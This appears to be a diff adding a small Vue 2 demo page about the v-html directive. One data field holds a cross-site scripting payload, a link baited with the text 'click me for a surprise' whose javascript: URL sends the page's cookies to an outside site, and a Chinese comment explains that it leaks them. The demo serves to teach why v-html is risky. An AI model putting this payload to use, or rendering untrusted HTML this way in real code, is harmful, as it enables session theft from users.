@@ -1,0 +1,34 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <meta charset='UTF-8'>
+    <title>Vue2</title>
+    <style>
+        *{
+            margin: 5px;
+        }
+    </style>
+</head>
+<body>
+    <div id='app'>
+        <div v-html="msg">
+        </div>
+        <div v-html="attack"></div>
+    </div>
+    <script src="vue.js"></script>
+    <script>
+        var app = new Vue({
+           data() {
+               return {
+                   msg:"<h3>hello world</h3>",
+
+                   // 这样写就会将cookie带入到第三方的网站里
+                   attack:"<a href=javascript:window.location=\"https://www.baidu.com?\"+document.cookie>点我有惊喜</a>"
+               }
+           }
+        })
+
+        app.$mount("#app");
+    </script>
+</body>
+</html>
